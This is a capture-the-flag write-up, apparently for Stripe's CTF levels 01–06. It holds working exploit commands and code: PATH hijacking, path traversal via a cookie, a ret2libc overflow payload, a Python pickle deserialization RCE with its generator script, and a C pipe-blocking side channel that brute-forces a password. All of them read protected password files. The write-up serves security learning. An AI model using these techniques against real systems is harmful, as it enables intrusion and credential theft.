Password for the flag:

theflagl0eFTtT5oi0nOTxO5

#Level 01:


    level01@ctf5:/tmp/tmp.wDAihwYEyF$ echo -e '#!/bin/sh\ncat /home/level02/.password' > date
    level01@ctf5:/tmp/tmp.wDAihwYEyF$ chmod a+x date
    level01@ctf5:/tmp/tmp.wDAihwYEyF$ export PATH=$PWD:$PATH
    level01@ctf5:/tmp/tmp.wDAihwYEyF$ /levels/level01
    Current time: kxlVXUvzv

#Level 02:
---------

    level02@ctf6:/tmp/tmp.pgI0ftRHDR$ curl -H 'Cookie:user_details=../../../..//home/level03/.password' --digest -u level02:kxlVXUvzv http://ctf.stri.pe/level02.php

    <html>
      <head>
        <title>Level02</title>
      </head>
      <body>
        <h1>Welcome to the challenge!</h1>
        <div class="main">
          <p>Or0m4UX07b
    </p>
                <form action="#" method="post">
            Name: <input name="name" type="text" length="40" /><br />
            Age: <input name="age" type="text" length="2" /><br /><br />
            <input type="submit" value="Submit!" />
          </form>
              </div>
      </body>
    </html>


#Level 03

level03 doesn't do negative bounds checking on the user input. also, the address of the buffer in the "truncate_and_call" method is a negative distance from the address of the fn_ptr array. by passing in the difference as the first argument the program will try to use the first 4 characters of the buffer as a function address. I passed the address of the "run" method in the second argument into the buffer. The program would then try to execute a program with the same name as the 2nd argument so I created such a program.


    level03@ctf5:/tmp/tmp.XjSS3WhsjY$ PAYLOAD=`printf "\x5b\x87\x04\x08"`
    level03@ctf5:/tmp/tmp.XjSS3WhsjY$ echo -e '#!/bin/sh\ncat /home/level04/.password' > $PAYLOAD
    level03@ctf5:/tmp/tmp.XjSS3WhsjY$ chmod a+x $PAYLOAD
    level03@ctf5:/tmp/tmp.XjSS3WhsjY$ export PATH=$PWD:$PATH
    level03@ctf5:/tmp/tmp.XjSS3WhsjY$ /levels/level03 -28 "$PAYLOAD"


#Level 04


level04 is vulnerable to a buffer overflow but it is a bit tricky to exploit because of ASLR. After looking at the entropy of the address (<= 12 bits) for the 'system' method I decided to do a return into libc attack. I found the address of the 'system' method using gdb and the address of a '/bin/sh' string using gdb then overwrote the saved EIP to the address of the system method and added the address of '/bin/sh' as an argument. I tested using gdb without address randomization first then turned on address randomization to find an address and then repeated the same address many times until I was lucky enough to succeed.

# working without address randomisation

    gdb --args ./level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xe3\xea\xf7\xde\xad\xbe\xef\xee\x6b\xfa\xf7"'`

# working with address randomisation. needs to be repeatedly run to succeed.

    /levels/level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xc3\x66\xf7\xde\xad\xbe\xef\xee\x4b\x76\xf7"'`


#Level 05

If you put " job: <pickle_data>" in the post data then the pickle data will be unpickled by the serialization process and python unpickling lets you call arbitrary methods. I used eval+compile to evaluate a python program I wrote. The program goes through all the jobs in the job directory and writes out a corresponding result containing the password in the result directory.

maker.py creates the url encoded string and eval.py is the program I compile and evaluate.

maker.py
--------

    #!/usr/bin/env python
    import re
    import pickle
    import urllib
    import pickletools
    import time

    class Job(object):

        def __init__(self):
            self.id = "lols"
            self.created = time.time()
            self.started = time.time()
            self.completed = time.time()


    evalpy = open("eval.py").read()
    evalpy = evalpy.replace("\\", "\\\\").replace("\n", "\\n")

    print evalpy

    eval(compile("print 'lols'", "test", 'exec'))


    content = "hello friend; job: c__builtin__\neval\n(c__builtin__\ncompile\n(S'%s'\nS'die'\nS'exec'\ntRtR." % (evalpy)

    serialized = "type: JOB; data: %s" % (content)

    parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)

    match = parser.match(serialized)
    job = match.group(3)
    #result = pickle.loads(job)
    print pickletools.dis(job)
    print urllib.quote(content)

eval.py
-------

    #!/usr/bin/env python

    jobs = __import__("os").listdir("/tmp/level05/jobs")

    password = open("/home/level06/.password").read()

    pickle_data = "ccopy_reg\n_reconstructor\np0\n(c__main__\nJob\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nS'started'\np6\nF1330126182.060731\nsS'completed'\np7\nF1330126182.060732\nsS'id'\np8\nS'lols'\np9\nsS'created'\np10\nF1330126182.06073\nsb."


    serialized = "type: RESULT; data: %s; job: %s" % (password, pickle_data)

    for job in jobs:
      open("/tmp/level05/results/%s" % (job), "w").write(serialized)


Running:

    level05@ctf6:/tmp/tmp.MHtXlXe9NB$ curl localhost:9020 -d
    "hello%20friend%3B%20job%3A%20c__builtin__%0Aeval%0A%28c__builtin__%0Acompile%0A%28S%27%23%21/usr/bin/env%20python%5Cn%5Cnjobs%20%3D%20__import__%28%22os%22%29.listdir%28%22/tmp/level05/jobs%22%29%5Cn%5Cnpassword%20%3D%20open%28%22/home/level06/.password%22%29.read%28%29%5Cn%5Cnpickle_data%20%3D%20%22ccopy_reg%5C%5Cn_reconstructor%5C%5Cnp0%5C%5Cn%28c__main__%5C%5CnJob%5C%5Cnp1%5C%5Cnc__builtin__%5C%5Cnobject%5C%5Cnp2%5C%5CnNtp3%5C%5CnRp4%5C%5Cn%28dp5%5C%5CnS%27started%27%5C%5Cnp6%5C%5CnF1330126182.060731%5C%5CnsS%27completed%27%5C%5Cnp7%5C%5CnF1330126182.060732%5C%5CnsS%27id%27%5C%5Cnp8%5C%5CnS%27lols%27%5C%5Cnp9%5C%5CnsS%27created%27%5C%5Cnp10%5C%5CnF1330126182.06073%5C%5Cnsb.%22%5Cn%5Cn%5Cnserialized%20%3D%20%22type%3A%20RESULT%3B%20data%3A%20%25s%3B%20job%3A%20%25s%22%20%25%20%28password%2C%20pickle_data%29%5Cn%5Cnfor%20job%20in%20jobs%3A%5Cn%20%20open%28%22/tmp/level05/results/%25s%22%20%25%20%28job%29%2C%20%22w%22%29.write%28serialized%29%5Cn%5Cn%5Cn%27%0AS%27die%27%0AS%27exec%27%0AtRtR."
    {
       "processing_time": 9.5367431640625e-07,
       "queue_time": 233.4059009552002,
       "result": "SF2w8qU1QDj\n"
    }

#Level 06


In linux after and you write 65536 bytes to a pipe without reading any bytes further writes will block. 

Using this we can test whether the last character in a password is correct. Say we have a password 'CCCU' where 'C' is a correct character and 'U' is an unknown character. We then extend this password with a sentinel character. The sentinel prevents the level06 program from printing an incorrect message due to the length check that is performed when the end of the guess is reached. I used the '\1' character for this. Now the password to check is 'CCCU\1'.

We attach the level06 programs stdout and stderr to a pipes and write enough bytes to the stderr pipe so that after the level06 program writes the welcome message and the '.' characters for the 'C' and the 'U' character it will block. We then pause for 200ms and do a non-blocking read of stdin. If we receive the incorrect message then we know the 'U' character is incorrect. Otherwise if we don't receive an incorrect message we assume the 'U' character is correct. 

We can then loop through all the possible 'U' characters to find the next correct character.

This procedure is repeated starting from the the empty string until no more correct characters can be found and the final string is the password.


    #include <unistd.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stdio.h>
    #include <ctype.h>
    #include <sys/wait.h>
    #include <stdlib.h>

    #define CAPACITY (65536)
    #define PROGRAM "/levels/level06"
    #define PASSWORD_FILE "/home/the-flag/.password"
    #define ERROR "Ha ha, your password is incorrect!\n"
    #define FIRST_LINE "Welcome to the password checker!\n"

    int test_password(char* correct_so_far, char letter_to_check) {
      
      int stderr_fds[] = {0, 0};
      int stdout_fds[] = {0, 0};
      char buf[CAPACITY] = {'A'};
      char minibuf[1];
      char first_line[strlen(FIRST_LINE)];

      for (int i = 0; i < CAPACITY; ++i) {
        buf[i] = 'A';
      }

      pipe(stderr_fds);
      pipe(stdout_fds);

      int res = write(stderr_fds[1], buf, CAPACITY - 33 - strlen(correct_so_far) - 1);

      
      if (!fork()) {

        char password_to_check[1024];
        strcpy(password_to_check, correct_so_far);
        password_to_check[strlen(correct_so_far)] = letter_to_check;
        password_to_check[strlen(correct_so_far) + 1] = '\1';
        password_to_check[strlen(correct_so_far) + 2] = '\0';

        char* argv[] =  {PROGRAM, PASSWORD_FILE, password_to_check, NULL};

        dup2(stderr_fds[1], 2);
        dup2(stdout_fds[1], 1);
        close(0);
        close(stdout_fds[0]);
        close(stderr_fds[0]);
        execv(PROGRAM, argv);
        exit(-1);
      }

      close(stderr_fds[1]);
      close(stdout_fds[1]);

      fcntl(stdout_fds[0], F_SETFL, O_NONBLOCK);
      int read_res;

      usleep(1000 * 200);

      char stdin_buf[strlen(ERROR)];

      read_res = read(stdout_fds[0], stdin_buf, strlen(ERROR));

      int guess_correct = (read_res == -1);


      read_res = read(stderr_fds[0], buf, CAPACITY);

      printf("waiting for child\n");
      wait(NULL);
      close(stderr_fds[0]);
      close(stdout_fds[0]);

      return guess_correct;
    }


    int guess_next_char(char* so_far) {
      int next_char = 0;
      for (int c = 1; c < 255; ++c) {
        if (isalnum(c)) {
          int guess = test_password(so_far, c);
          printf("guess for char: %c %d\n", c, guess);
          if (guess) {
            printf("**** NEXT CHARACTER IS %c ****\n", c);
            next_char = c;
            break;
          }
        }
      }
      return next_char;
    }

    int go() {
      char guess_so_far[1024];
      guess_so_far[0] = '\0';
      int current = 0;

      while (1) {
        int next_char = guess_next_char(guess_so_far);
        if (next_char == 0) {
          break;
        }
        guess_so_far[current] = next_char;
        guess_so_far[current + 1] = '\0';
        ++current;
      }

      printf("guessed password: %s\n", guess_so_far);
    }    

    int main() {
      go();
    }